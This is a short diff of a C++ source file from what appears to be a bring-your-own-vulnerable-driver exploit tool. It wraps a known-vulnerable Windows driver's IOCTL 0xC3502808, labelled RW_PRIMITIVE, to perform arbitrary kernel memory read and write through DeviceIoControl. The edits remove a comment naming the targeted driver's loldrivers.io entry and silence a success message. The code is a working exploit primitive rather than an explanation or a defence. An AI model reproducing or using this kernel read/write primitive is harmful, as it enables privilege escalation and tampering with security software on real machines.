@@ -4,7 +4,6 @@
 
 #include "myIO.hpp"
 
-// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/ <- targeted driver
 #define RW_PRIMITIVE 0xC3502808 //switch case code to driver function with arbitrary RW
 
 struct KernelReadWrite {
@@ -52,13 +51,15 @@ public:
 
 		DWORD bytesReturned = 0;
 		BYTE bufferReturned[48] = { 0 };
+
 		bool isSuccess = DeviceIoControl(this->hDriver, RW_PRIMITIVE, (LPVOID)KRW, sizeof(KernelReadWrite), NULL, 0, NULL, NULL);
 		if (isSuccess) {
-			print(OutputMode::_SUCCESS, "Copied " + std::to_string(size) + " bytes to buffer");
+			//print(OutputMode::_SUCCESS, "Copied " + std::to_string(size) + " bytes to buffer");
 		}
 		else {
 			print(OutputMode::_ERROR, "Error while trying to copy buffer! Error code:" + std::to_string(GetLastError()) );
 		}
+
 		return isSuccess;
 	}
 };
